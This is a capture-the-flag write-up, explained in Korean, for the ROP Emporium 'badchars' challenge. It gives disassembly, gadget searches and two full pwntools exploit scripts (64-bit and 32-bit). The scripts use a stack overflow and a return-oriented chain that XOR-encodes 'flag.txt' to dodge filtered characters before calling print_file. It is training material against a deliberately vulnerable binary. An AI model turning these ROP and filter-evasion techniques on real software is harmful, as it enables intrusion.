# [badchars](https://ropemporium.com/challenge/badchars.html)
<br />

**Description:**
> An arbitrary write challenge with a twist; certain input characters get mangled as they make their way onto the stack.
Find a way to deal with this and craft your exploit.

<br />
<br />

# x86_64

**Binary Protections:**
```yaml
badchars: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6c79e265b17cf6845beca7e17d6d8ac2ecb27556, not stripped

[*] '/home/kali/pico/badchars'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
```
<br />

> [!WARNING]
> ```text
> badchars are: 'x', 'g', 'a', '.'
> ```
> 문제에서는 특정 문자의 사용을 금지하고 있으며, `flag.txt`의 일부 문자열을 사용하지 못합니다.

<br />

해당 문제는 `xor`연산을 두 번 진행하면 원래 값으로 돌아오는 특성을 이용하여 규칙을 우회할 수 있습니다.

<br />

```yaml
$ objdump -d badchars
Disassembly of section .text:

0000000000400617 <usefulFunction>:
  400617:       55                      push   %rbp
  400618:       48 89 e5                mov    %rsp,%rbp
  40061b:       bf c4 06 40 00          mov    $0x4006c4,%edi
  400620:       e8 eb fe ff ff          call   400510 <print_file@plt>
  400625:       90                      nop
  400626:       5d                      pop    %rbp
  400627:       c3                      ret

0000000000400628 <usefulGadgets>:
  400628:       45 30 37                xor    %r14b,(%r15)
  40062b:       c3                      ret
  40062c:       45 00 37                add    %r14b,(%r15)
  40062f:       c3                      ret
  400630:       45 28 37                sub    %r14b,(%r15)
  400633:       c3                      ret
  400634:       4d 89 65 00             mov    %r12,0x0(%r13)
  400638:       c3                      ret
  400639:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)
```
- `print_file@plt = 0x400510`
- `xor r15; r14 ; ret = 0x400628`
- `mov [r13] ; r12 ; ret = 0x400634`

```yaml
$ ROPgadget --binary badchars | grep "pop rdi"
0x00000000004006a3 : pop rdi ; ret
```
```yaml
$ ROPgadget --binary badchars | grep "pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret"
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
```
```yaml
$ ROPgadget --binary badchars | grep "pop r14 ; pop r15 ; ret"
0x00000000004006a0 : pop r14 ; pop r15 ; ret
```
위 과정을 통해 필요한 가젯을 구할 수 있습니다. 이제 아래 순서를 참고하여 가젯들로 `rop`를 진행합니다.

<br />

> [!NOTE]
> 1. 규칙을 우회하기 위해 `"flag.txt"`를 `xor` 합니다. 
> 2. 연산된 값은 레지스터를 통해 `bss` 영역에 저장됩니다. (규칙 우회)
> 3. 저장된 값은 다시 `xor` 연산을 통해 문자열을 복원합니다.
> 4. `"flag.txt"`를 `print_file`의 인자로 넘겨 호출합니다.

<br />
<br />

```python
from pwn import *

def xor(data):
    res = b""
    for ch in data:
        res += ((ch) ^ 2).to_bytes(1, "little")
    return res

context.log_level = "error"

p = process("./badchars")

# gadget
pop_rdi = 0x4006a3
xor_r15_r14 = 0x400628
pop_r14_r15 = 0x4006a0
mov_r13_r12 = 0x400634
pop_r12_r13_r14_r15 = 0x40069c

print_file = 0x400510
bss = 0x601038

flag = xor(b"flag.txt")
print("flag: ", flag)

payload = b'A' * 40

payload += p64(pop_r12_r13_r14_r15)
payload += flag + p64(bss) + p64(0) + p64(0)
payload += p64(mov_r13_r12) # [bss] = "dnce,vzv"

for i in range(8):
    payload += p64(pop_r14_r15)
    payload += p64(2) + p64(bss + i)
    payload += p64(xor_r15_r14) # [bss] = "flag.txt" 

payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(print_file)

p.sendline(payload)
p.interactive()
```
```yaml
$ python3 test.py
b'flag: ' b'dnce,vzv'
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> Thank you!
ROPE{a_placeholder_32byte_flag!}
$
```

<br />
<br />

# x86

**Binary Protections:**
```yaml
badchars32: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=48ae8ea56ad3b3ef64444a622db86aa4f0f26b7d, not stripped

[*] '/home/kali/pico/badchars32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    RUNPATH:    b'.'
    Stripped:   No
```
<br />

> [!WARNING]
> ```text
> badchars are: 'x', 'g', 'a', '.'
> ```

풀이 과정은 `x86_64`와 동일하므로, 필요한 가젯을 찾아 적절히 rop를 진행하면 쉽게 풀이할 수 있습니다.
 
<br />

```yaml
objdump -d badchars32
...
Disassembly of section .text:

0804852a <usefulFunction>:
 804852a:       55                      push   %ebp
 804852b:       89 e5                   mov    %esp,%ebp
 804852d:       83 ec 08                sub    $0x8,%esp
 8048530:       83 ec 0c                sub    $0xc,%esp
 8048533:       68 e0 85 04 08          push   $0x80485e0
 8048538:       e8 93 fe ff ff          call   80483d0 <print_file@plt>
 804853d:       83 c4 10                add    $0x10,%esp
 8048540:       90                      nop
 8048541:       c9                      leave
 8048542:       c3                      ret

08048543 <usefulGadgets>:
 8048543:       00 5d 00                add    %bl,0x0(%ebp)
 8048546:       c3                      ret
 8048547:       30 5d 00                xor    %bl,0x0(%ebp)
 804854a:       c3                      ret
 804854b:       28 5d 00                sub    %bl,0x0(%ebp)
 804854e:       c3                      ret
 804854f:       89 37                   mov    %esi,(%edi)
 8048551:       c3                      ret
...
```
- `print_file@plt = 0x80483d0`
- `xor [ebp], bl ; ret = 0x8048547`
- `mov [edi], esi ; ret = 0x804854f`

```yaml
$ ROPgadget --binary badchars32 | grep "pop esi ; pop edi"
0x080485b9 : pop esi ; pop edi ; pop ebp ; ret
```
```yaml
$ ROPgadget --binary badchars32 | grep "pop ebx"
0x0804839d : pop ebx ; ret
```
```yaml
$ ROPgadget --binary badchars32 | grep "pop ebp"
0x080485bb : pop ebp ; ret
```
```yaml
$ ROPgadget --binary badchars32 | grep "ret"
0x08048386 : ret
```

<br />
<br />

```python
from pwn import *

def xor(data):
    res = b""
    for ch in data:
        res += (ch ^ 2).to_bytes(1, "little")
    return res

pop_esi_edi_ebp = 0x080485b9
pop_ebp = 0x080485bb
pop_ebx = 0x0804839d
mov_esi_edi = 0x804854f
xor_ebp_bl = 0x8048547
ret = 0x08048386

print_file = 0x80483d0
data = 0x804a018

flag = [xor(b"flag"), xor(b".txt")]

pay = b"A"*44

pay += p32(pop_esi_edi_ebp)
pay += flag[0] + p32(data) + p32(0)
pay += p32(mov_esi_edi)

pay += p32(pop_esi_edi_ebp)
pay += flag[1] + p32(data+4) + p32(0)
pay += p32(mov_esi_edi)

for i in range(8):
    pay += p32(pop_ebp) + p32(data+i)
    pay += p32(pop_ebx) + p32(2)
    pay += p32(xor_ebp_bl)

pay += p32(print_file)
pay += p32(ret)
pay += p32(data)

context.log_level = "error"

p = process("./badchars32")

p.sendline(pay)
p.interactive()
```
```yaml
$ python3 test.py
badchars by ROP Emporium
x86

badchars are: 'x', 'g', 'a', '.'
> Thank you!
ROPE{a_placeholder_32byte_flag!}
$
```






